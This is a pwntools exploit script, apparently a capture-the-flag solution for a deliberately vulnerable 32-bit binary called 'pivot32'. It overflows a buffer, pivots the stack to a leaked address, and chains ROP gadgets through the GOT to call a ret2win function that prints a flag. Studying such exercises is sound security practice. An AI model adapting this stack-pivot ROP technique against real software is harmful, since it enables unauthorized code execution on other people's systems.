import time

from pwn import *


EXECUTABLE = "./pivot32"
context.binary = elf = ELF(EXECUTABLE)
lib_pivot = ELF("./libpivot32.so")


p = process(EXECUTABLE)
if args.GDB:
    gdb.attach(p)


OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", b"AAAA")
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

p.recvuntil(b"to pivot: ")
pivot_point = int(p.recvline(keepends=False), 16)
log.debug(f"Pivot point: {hex(pivot_point)}")

# Create rop for pivoting
pivot = ROP(elf)
pivot(eax=pivot_point)
pivot.raw(elf.symbols.usefulGadgets + 0x02) # xchg eax, esp; ret;


# Create rop to call ret2win
ret2win_offset = lib_pivot.symbols.ret2win - lib_pivot.symbols.foothold_function

rop = ROP(elf)
# First make sure to call the foothold function such that the got is set
rop.call(elf.plt.foothold_function)
# Follow the pointer
rop(eax=elf.got.foothold_function)
rop.raw(elf.symbols.usefulGadgets + 0x04) # mov eax, dword [eax]; ret;

# Add ret2win offset to eax
rop(ebx=ret2win_offset)
rop.raw(elf.symbols.usefulGadgets + 0x07) # add eax, ebx; ret;

# Call eax (thus ret2win)
rop.raw(0x080485f0) # call eax;


log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", rop.chain())

log.debug("Sending pivot chain:\n" + pivot.dump())
p.sendafter(b"> ", flat({ OFFSET: pivot.chain() }))

p.recvline() # Thank you
p.recvline() # Foothold function call

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
